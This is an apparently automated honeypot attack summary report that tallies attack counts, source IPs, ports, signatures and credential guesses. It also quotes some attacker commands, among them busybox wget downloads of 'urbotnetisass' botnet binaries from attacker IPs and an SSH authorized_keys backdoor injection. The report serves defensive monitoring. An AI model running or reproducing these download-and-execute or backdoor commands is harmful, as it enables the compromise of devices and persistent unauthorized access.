Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T11:02:32Z
**Timeframe:** 2025-10-01T10:20:01Z to 2025-10-01T11:00:01Z
**Files Used:**
- agg_log_20251001T102001Z.json
- agg_log_20251001T104001Z.json
- agg_log_20251001T110001Z.json

**Executive Summary:**

This report summarizes 8242 attacks recorded across the honeypot network. The majority of attacks were captured by the Cowrie honeypot, with significant activity also observed on Honeytrap, Ciscoasa, and Suricata. A wide range of attack vectors were identified, including brute-force attempts, vulnerability scanning, and the execution of malicious commands. The most prominent attacking IP was 92.242.166.161.

**Detailed Analysis:**

**Attacks by Honeypot:**
- Cowrie: 2514
- Honeytrap: 1620
- Ciscoasa: 1408
- Suricata: 1315
- Dionaea: 464
- Mailoney: 437
- Sentrypeer: 300
- ElasticPot: 46
- Tanner: 36
- Adbhoney: 33
- H0neytr4p: 22
- Redishoneypot: 22
- Honeyaml: 14
- Miniprint: 8
- ConPot: 3

**Top Attacking IPs:**
- 92.242.166.161: 414
- 81.215.207.182: 407
- 185.156.73.167: 362
- 185.156.73.166: 365
- 92.63.197.55: 358
- 92.63.197.59: 326
- 88.210.63.16: 269
- 87.106.35.227: 267
- 220.77.245.227: 246
- 92.204.255.106: 299
- 196.251.84.92: 161
- 45.245.61.114: 208
- 137.184.202.107: 148
- 154.57.216.74: 178
- 81.192.46.36: 137
- 5.56.132.116: 121
- 103.157.25.60: 123
- 49.204.74.149: 128
- 103.183.74.214: 114
- 223.197.186.7: 93

**Top Targeted Ports/Protocols:**
- 22: 446
- 25: 434
- 445: 407
- 5060: 298
- 3388: 120
- 8333: 137
- TCP/22: 64
- 80: 42
- 9200: 46
- 23: 48
- 33335: 28
- 8000: 22
- 8003: 22
- 6379: 19
- 443: 21
- TCP/3388: 17
- 27017: 15
- TCP/1521: 15
- TCP/1433: 14
- 7574: 14

**Most Common CVEs:**
- CVE-2021-3449 CVE-2021-3449: 3
- CVE-2019-11500 CVE-2019-11500: 3
- CVE-2006-2369: 3

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 12
- lockr -ia .ssh: 12
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~: 12
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...: 6
- uname -a: 3
- whoami: 3
- cat /proc/cpuinfo | grep name | wc -l: 2
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; ...: 2
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 2
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 2
- ls -lh $(which ls): 2
- which ls: 2
- crontab -l: 2
- w: 2
- uname -m: 2
- cat /proc/cpuinfo | grep model | grep name | wc -l: 2
- top: 2
- uname: 2
- lscpu | grep Model: 2
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 2
- cd /data/local/tmp/; busybox wget http://178.16.142.61/w.sh; ...: 1

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1: 355
- 2402000: 355
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 196
- 2023753: 196
- ET SCAN NMAP -sS window 1024: 162
- 2009582: 162
- ET HUNTING RDP Authentication Bypass Attempt: 81
- 2034857: 81
- ET INFO Reserved Internal IP Traffic: 58
- 2002752: 58
- ET SCAN Potential SSH Scan: 19
- 2001219: 19
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32: 26
- 2400031: 26
- ET INFO Proxy CONNECT Request: 12
- 2001675: 12
- ET INFO CURL User Agent: 11
- 2002824: 11
- ET SCAN Suspicious inbound to Oracle SQL port 1521: 10
- 2010936: 10

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34: 12
- root/3245gs5662d34: 5
- root/nPSpP4PBW0: 4
- test/zhbjETuyMffoL8F: 4
- titu/Ahgf3487@rtjhskl854hd47893@#a4nC: 4
- root/A12345@: 3
- root/LeitboGi0ro: 3
- superadmin/admin123: 3
- mohammad/123: 3
- root/qy123456: 3
- appadmin/appadmin: 3
- root/12345: 2
- centos/centos: 2
- root/qazwsxedcrfv: 2
- ftpuser/admin1234: 2
- lruiz/lruiz: 2
- geoserver/geoserver: 2
- root/karachi: 2
- root/passroot: 2
- alexis/alexis2024: 2

**Files Uploaded/Downloaded:**
- arm.urbotnetisass;: 6
- arm.urbotnetisass: 6
- arm5.urbotnetisass;: 6
- arm5.urbotnetisass: 6
- arm6.urbotnetisass;: 6
- arm6.urbotnetisass: 6
- arm7.urbotnetisass;: 6
- arm7.urbotnetisass: 6
- x86_32.urbotnetisass;: 6
- x86_32.urbotnetisass: 6
- mips.urbotnetisass;: 6
- mips.urbotnetisass: 6
- mipsel.urbotnetisass;: 6
- mipsel.urbotnetisass: 6
- wget.sh;: 4
- s:Envelope>: 2
- w.sh;: 1
- c.sh;: 1
- gpon80&ipv=0: 1
- &currentsetting.htm=1: 1

**HTTP User-Agents:**
- No user agents were logged in this timeframe.

**SSH Clients:**
- No SSH clients were logged in this timeframe.

**SSH Servers:**
- No SSH servers were logged in this timeframe.

**Top Attacker AS Organizations:**
- No attacker AS organizations were logged in this timeframe.

**Key Observations and Anomalies:**

- A significant number of commands were executed related to the `urbotnetisass` malware, indicating a coordinated campaign to compromise IoT devices.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys ...` suggests an attempt to install a persistent backdoor via SSH authorized keys.
- There is a high volume of scanning activity for MS Terminal Server (port 3388) and RDP, as well as Oracle and MSSQL databases.

This concludes the Honeypot Attack Summary Report.